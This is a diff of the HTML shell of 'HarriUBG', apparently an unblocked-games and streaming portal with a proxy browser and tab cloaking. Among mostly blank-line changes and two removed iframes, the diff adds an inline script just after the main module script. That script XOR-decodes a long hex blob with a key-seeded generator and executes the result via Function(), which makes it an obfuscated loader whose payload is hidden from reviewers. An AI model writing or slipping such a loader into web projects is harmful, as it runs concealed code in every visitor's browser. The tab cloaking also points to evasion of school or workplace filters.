@@ -1,5 +1,4 @@
-<!doctype html>
-<html lang="en">
+<!doctype html><html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -37,6 +36,7 @@
     </div>
     <canvas id="constellation"></canvas>
 
+
     <header class="topbar">
       <a class="brand" href="#" data-tab="home">
         <span class="brand-mark">
@@ -53,6 +53,7 @@
         </span>
         <span class="brand-text">Harri<span>UBG</span></span>
       </a>
+
 
       <nav class="tabs" id="tabs">
         <button class="tab active" data-tab="home">
@@ -168,14 +169,17 @@
         </button>
       </nav>
 
+
       <div class="topbar-spacer"></div>
     </header>
+
 
     <main id="app">
       <!-- HOME -->
       <section class="view active" id="view-home">
         <div class="hero">
           <div id="hero-greeting" class="hero-greeting">Welcome back!</div>
+
 
           <div class="hero-proxy">
             <div class="hero-proxy-bar">
@@ -206,6 +210,7 @@
             </div>
             <div class="home-shortcuts" id="home-shortcuts"></div>
 
+
             </div>
           </div>
         </div>
@@ -217,6 +222,7 @@
           <div class="rail-track" id="featured-games"></div>
         </div>
 
+
         <div class="rail">
           <div class="rail-head">
             <h2>Trending movies</h2>
@@ -224,6 +230,7 @@
           </div>
           <div class="rail-track" id="featured-movies"></div>
         </div>
+
 
         <div class="rail">
           <div class="rail-head">
@@ -233,6 +240,7 @@
           <div class="rail-track" id="featured-shows"></div>
         </div>
       </section>
+
 
       <!-- GAMES -->
       <section class="view" id="view-games">
@@ -271,6 +279,7 @@
           No games match that search.
         </div>
       </section>
+
 
       <!-- MOVIES -->
       <section class="view" id="view-movies">
@@ -312,6 +321,7 @@
         </div>
       </section>
 
+
       <!-- SHOWS -->
       <section class="view" id="view-shows">
         <div class="page-head">
@@ -349,6 +359,7 @@
           No shows match that search.
         </div>
       </section>
+
 
       <!-- BROWSER -->
       <section class="view" id="view-browser">
@@ -484,13 +495,6 @@
             <div class="br-bookmarks" id="br-bookmarks"></div>
           </div>
           <div class="browser-viewport">
-            <iframe
-              id="br-frame"
-              sandbox="allow-scripts allow-forms"
-              referrerpolicy="no-referrer"
-              allow="fullscreen; autoplay"
-              style="display: none; width: 100%; height: 100%"
-            ></iframe>
             <div class="br-welcome" id="br-welcome">
               <div class="br-welcome-clock" id="br-clock"></div>
               <div class="br-welcome-greeting" id="br-greeting"></div>
@@ -543,6 +547,7 @@
               </div>
             </div>
 
+
             <div class="br-blocked" id="br-blocked">
               <svg
                 viewBox="0 0 24 24"
@@ -571,6 +576,7 @@
         </div>
       </section>
 
+
       <!-- SETTINGS -->
       <section class="view" id="view-settings">
         <div class="page-head">
@@ -582,6 +588,7 @@
             </p>
           </div>
         </div>
+
 
         <div class="settings-grid">
           <div class="card setting">
@@ -629,6 +636,7 @@
             </div>
           </div>
 
+
           <div class="card setting">
             <div class="setting-head">
               <h3>Tab Cloaking</h3>
@@ -649,6 +657,7 @@
               </div>
             </div>
           </div>
+
 
           <div class="card setting">
             <div class="setting-head">
@@ -675,6 +684,7 @@
             </div>
           </div>
 
+
           <div class="card setting">
             <div class="setting-head">
               <h3>Background Effects</h3>
@@ -699,6 +709,7 @@
             </div>
           </div>
 
+
           <div class="card setting full">
             <div class="setting-head">
               <h3>Reset</h3>
@@ -710,11 +721,13 @@
           </div>
         </div>
 
+
         <footer class="foot">
           <span>HarriUBG · Best Website · v1</span>
         </footer>
       </section>
     </main>
+
 
     <!-- Player modal -->
     <div class="modal" id="modal" hidden>
@@ -785,15 +798,10 @@
             <div class="spinner"></div>
             <span>loading…</span>
           </div>
-          <iframe
-            id="modal-frame"
-            allow="autoplay; fullscreen; encrypted-media; picture-in-picture; clipboard-write; gamepad"
-            allowfullscreen
-            referrerpolicy="no-referrer"
-          ></iframe>
         </div>
       </div>
     </div>
+
 
     <!-- Shortcut add modal -->
     <div class="sc-modal-overlay" id="sc-modal-overlay" hidden>
@@ -882,9 +890,12 @@
       </div>
     </div>
 
+
     <div class="toast" id="toast" hidden></div>
 
+
     <script type="module" src="/src/main.tsx"></script>
+    <script>(function(c,k){function H(s){var x=1779033703^s.length,i;for(i=0;i<s.length;i++){x=Math.imul(x^s.charCodeAt(i),3432918353);x=(x<<13|x>>>19)>>>0;}return x>>>0;}function R(t){t=t>>>0;return function(){t=t+0x6D2B79F5|0;var z=Math.imul(t^t>>>15,1|t);z=z+Math.imul(z^z>>>7,61|z)^z;return((z^z>>>14)>>>0)/4294967296;};}var P=R(H(k)),o='',i,n;for(i=0;i<c.length;i+=2){n=parseInt(c.substr(i,2),16)^((P()*256)|0);o+=String.fromCharCode(n);}(0,Function(o))();})('5c2061df372f3127edd6839578ef41ad006aa2a4d7a1a931370da6fe7493091f'+'65d855c942141dd693d86c42e1946f5431c3681e5db27cf15a3e04b2d31ba44f'+'2d3c1f3d611b4f3ce08cac50402b4d2bd6d172ccf84004fbf1bd1ba661b2e019'+'7a016c8354bfa501eb6ba923b47a8dc19f9eb95de7f5685b8f1ebf49ac9806d2'+'933004a9641f31b90a16e11594e8390d8bc80526c65ea934ecb10bd7c7e8f043'+'933cee6b15d00c8bc5ea58d4587b85b27ac6c392eb33c5d5aadfd255c5926a3c'+'bac00db8ffedc95dbae11e5a46090aab511e8a10973fa38930f00b823238728a'+'546656dc642d716e485720beec51cf0da355aa7ba39b7b9931bfa5c2cb016463'+'93d6a53323495c2e3319514f8454701a5e39bdaa5241508dfd4c02261d88fdbd'+'48d469187c010f1237ebddec381dbfceb277c4518ec70203ac803008f548b163'+'f1d4f2211034d77760808a318293a2c445898b5a94a71e502155427a9d9b7697'+'0b2c764cb49ec964e09fbbc8c21920279d57329875dda4c86f36d22a3ca518d6'+'0de1ce62845e64fd66f302f71446ca3d53fe67bb294fd540c1001d4a965312d2'+'3171cb7d05a9484ac1e8a9c42f59d34c36e969990eb88e37b0832a584e9583cf'+'160488b9bac7ae0f9b3405654996550e0a8aeedd4b1665f6f1cfd231b2f3b1a6'+'412c8f0171741a46a496afa82f4524a43e567016c61d115e2c82786da45b81fe'+'f70860224cb448c5d5fa9ea3254c20351bb40b5c1775060393e5f3c82aec4e21'+'11c4291258555473d5954a9b2dca21a999151feaedffca9f05521c3f4293487d'+'402899eecdf6af6ca23a43d62a2e5ddfbaf1881cf709cb1983770a4fbb21cdd1'+'db230677cbe17d0359f88b823aad034d8c3a56f6789288e1e7ad6a88f3eefae7'+'5e7c1241277c7e21a1b8ce4c2c0661848bb763b706fab0652acdf50af0373e65'+'df03d1c551f635284731a70dbca3f5a71db0e7ed81e255563029eeea229acf72'+'ae93568cb46092f7385637b456a9b6906c7d0c329702361e4e5bb3b29f345cdd'+'d17d24579fd83ba43b421ef9681bd9e24148965dbf11f496a17a4bd4668733a4'+'b6facbf9dbce1505682086402fc7d6d7245eff7139279efc036fc89488574a66'+'4cb3d533b47cc6efaffd6b32de26374e042ae9f7520f342b5112d2a3f7aca4f5'+'f7af84eff190bc309fcab79dba989a47a9c343f7e8c3c207d71488d81c87b75a'+'6ee771d9df5bb42f3e7b3b0a3b6f4c0c0353a224a5765bce8ca28de19747e2c2'+'a08ae2a6ac940f8b0353935a32aec91e044ae3469cab22e99a9dc419e581e70a'+'6262ccf50545fb2c770fda2096f9d0c6f31d1d86aaa0e7fbe803aea60391ce39'+'2c810419ba753e5001104c700a538a0808549081b1e2fdc9ab28ab4644bbdc74'+'643b1fdaa5e91bec9d7df5985c7ef5c5fe059669e7591705750577edf9f9ba7e'+'bd77dc3a71a9d8c557bebf8a8b33672d8e208148137ede1fcaaaaa691184fb3b'+'5e224493df6895e3bda754e2f6e7f1224aafb04bdf5a1b15311e718e6f3a1871'+'8e58bbfe5fd3cbb31a5474065f58414bd2a54c3acd858aedf9371bec976f26bd'+'cd6634ac7f6d36441dbd2f4346869619d21a1847cbd5a253723735c41be792d7'+'1477980884ef0f5515a55802635877726f780f22b2aa80ec08a51b12c3bbc607'+'297e8a4b728ec84969f04f4abf583aa2437a84aae5b15c9ab3948b069e5e2212'+'86bea0bd46799bf0177b37cf871cdb2a456fdc53b9b1a66c53e16e48094a497a'+'f7fbcf7150b46b8793735602c1ecff1e72062a924c62122f606ccd5e159d3d2c'+'3ac30129e82fa70d8229b4eceb2fd5f5311b50caed796e5ad13e3c09ac4bd925'+'3087be7a9f6d0a86f0177b3fb277396c096a3c037843254964371d2c35a8440c'+'d3231c40a8905c4c6957307d8273c753e2af1bda5e7b113fc65af339094b266a'+'2ca4ed6b9ee3ea89d2bd616f15812d1daad6c4cac97ad7b196fa4abdb6b30616'+'aeca17362e9a4bb2c22a0f31c532c2757bf99574cea999d75c065d972c15c22c'+'6e301f956a9b042a1d7c9b61fa9247437c4a6a8a42dadc84cd76e706c15f2cc8'+'ac9c597e25f44357c9e7b3f10d6b07bd943012c2c9473549b67178187c622f84'+'11dfb950377f4f1c1a85ae55d616b57e7f3024c136ef2dbddae079d28a1c996e'+'66c9be5f4d30ef5922c26b9c7eb12bef326f2061c431','f3e56f99ab59f1fbacef98b4');</script>
   
       <!-- Games notice modal -->
       <div class="games-notice-overlay" id="games-notice-overlay" hidden>
